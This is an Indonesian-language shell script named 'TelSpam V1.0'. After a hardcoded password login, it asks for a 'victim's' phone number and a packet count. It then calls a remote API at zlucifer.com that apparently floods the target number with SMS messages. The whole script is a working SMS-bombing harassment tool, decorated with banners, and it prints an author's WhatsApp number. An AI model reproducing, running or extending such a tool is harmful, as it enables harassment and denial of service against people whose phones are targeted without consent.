#!/bin/sh
#Gunakan tools ini dengan bijak
#Link
get_sms=$(curl -s http://zlucifer.com/api/hackbae.php?request=sms)
#Fungsi
header(){
    sleep 2
    cowsay -f daemon "TelSpam" | lolcat
    echo ''
    sleep 0.1
    echo ' ________________________________' | lolcat
    sleep 0.1
    echo '|                                |' | lolcat
    sleep 0.1
    echo '|    Author : Mr.Ctg Cyber       |' | lolcat
    sleep 0.1
    echo '|      wa   : 083813844572       |' | lolcat
    sleep 0.1
    echo '|    github : github.com/CyberCTA|' | lolcat
    sleep 0.1
    echo '|     Team  : Lᴵᴳᴴᵀ Cᵞᴮᴱᴿ Iᴺᴰᴼᴺᴱˢᴵᴬ|' | lolcat
    sleep 0.1
    echo ' ________________________________' | lolcat
    menu1
}
menu1(){
    sleep 0.1
    echo ' ________________________________' | lolcat
    echo '|                                |' | lolcat
    sleep 0.1
    echo '|          TelSpam V1.0          |' | lolcat
    sleep 0.1
    echo ' ________________________________' | lolcat
    echo ''
    date | lolcat  
    echo '____________________________' | lolcat
    echo ''
    echo 'Beberapa pilihan : ' | lolcat
    echo ''
    echo '1) Spam SMS' | lolcat
    echo ''
    echo 'Pilih No 1 ?' | lolcat
    read -p "Root@$nama2-#" pill;
    case $pill in
    1)clear
    echo 'Silahkan masukkan no telepon korban' | lolcat
    echo 'Contoh : 089999999999' | lolcat
    pilihan1
    echo 'Berapa paket yg mau dikirimkan' | lolcat
    pilihan2
    echo 'Spam sms akan dikirimkan ke' $target "dan jumlah paket yg dikirim" $paket | lolcat
    echo 'Ingin melanjutkan[y/n]' | lolcat
    spamsms
    
    ;;
    
    *)clear 
    echo '[+] Maaf keyword yg anda masukkan salah' | lolcat
    echo '[+] Ingin ulang kembali[y/n]' | lolcat
    lagi
    
    ;;
    
    esac
}
pilihan1(){
    read -p "Root@$nama2-#" target;
}
pilihan2(){
    read -p "Root@$nama2-#" paket;
}
spamsms(){
    read -p "Root@$nama2-#" pili12;
    case $pili12 in
    y)clear
    echo 'Melakukan spam ke no' $target | lolcat
    echo ''
    echo 'Jangan exit dari aplikasi Bro sebelum spam selesai' | lolcat
    
target_do=$get_sms'/sms.php?nomor='$target'&paket='$paket CURL_RESPONSE=`curl -s -o /dev/null -w "%{http_code}" $target_do`
    echo '[+] Gunakan tools dengan baik Yh gan' | lolcat
    echo '[+] Ingin mengulang spam[y/n]' | lolcat
    lagi
    
    
    ;;
    
    n)clear 
    echo 'Terima kasih' $nama2 | lolcat
    sleep 1
    exit
    
    ;;
    
    esac
}
lagi(){
    read -p "Root@$nama2-#" y9;
    case $y9 in
    y)clear
    header
    menu1
    
    ;;
    
    n)clear
    echo 'Terima kasih' $nama2 | lolcat
    sleep 1
    exit
    
    ;;
    
    esac
}
#menu
clear
sleep 2
echo '[+] Memulai tools' | lolcat -a -d 10
clear
read -p "Tuliskan namamu : " nama2;
sleep 2
clear
sleep 2
figlet Login | lolcat -a -d 10
sleep 2
echo "[+] Masukkan Password" | lolcat
read -p "Root@$nama2-#" pw3;
#fungsi password
case $pw3 in
Mr.ctg_Cyber)sleep 2
echo '[√] Login berhasil' | lolcat
sleep 3
clear
header

;;

*)sleep 2
echo '[+] Login gagal' | lolcat

;;

esac
